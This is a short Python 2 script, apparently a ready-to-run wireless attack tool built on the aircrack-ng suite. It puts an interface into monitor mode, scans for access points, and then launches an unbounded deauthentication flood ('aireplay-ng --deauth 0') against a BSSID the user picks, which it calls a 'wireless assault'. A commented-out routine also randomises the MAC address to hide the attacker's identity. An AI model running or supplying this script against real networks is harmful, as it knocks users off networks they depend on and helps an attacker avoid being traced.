""":"
exec python $0 ${1+"$@"}
"""


import subprocess, time, os

print subprocess.call("airmon-ng")
print '\n>>>Select your wireless interface<<<'
interface = raw_input(">>>Interface: ")
print '\n[+] Interface set to {0}!'.format(interface)
time.sleep(1)

class script:

    '''def anon(self):
        print '>>>Randomizing MAC-Address for {0}'.format(interface)   
        os.system('ifconfig ' + interface + ' down')
        os.system('macchanger -r ' + interface)
        os.system('ifconfig ' + interface + ' up')
        print '\n[+] MAC-Address randomized!'
        time.sleep(2)'''

    def attack(self):       
        print '>>>Enabling monitor mode on {0}'.format(interface)
	os.system("ifconfig "+ interface + "down")
        os.system("airmon-ng start " + interface)
	os.system("airmon-ng check kill")
        #print '[+] monitor mode enabled for {0}'.format(interface)
        #print '>>>Spoofing mon0...'
        time.sleep(2)
        #commands_a = ['ifconfig mon0 down','macchanger -r mon0','ifconfig mon0 up']
        #for commands in commands_a:
        #    os.system(commands)
        #print '[+] mon0 has been successfully spoofed!'
        print '>>>Scanning...'
        os.system("xterm -hold -e 'airodump-ng wlan0mon' & disown")
        bssid_a = raw_input(">>>Select bssid of your target: ")
        #os.system("xterm -hold -e 'macchanger -s mon0' & disown")
        #bssid_h = raw_input(">>>Select your bssid (mon0): ")
        print '\n[+] Starting wireless assault on {0}!'.format(bssid_a)
        #time.sleep(2)
        os.system('aireplay-ng --deauth 0 -a ' + bssid_a + ' wlan0mon')
    
    def main(self):
        main = script()
        #main.anon()
        main.attack()

if __name__ == '__main__':
	start = script()
	start.main()
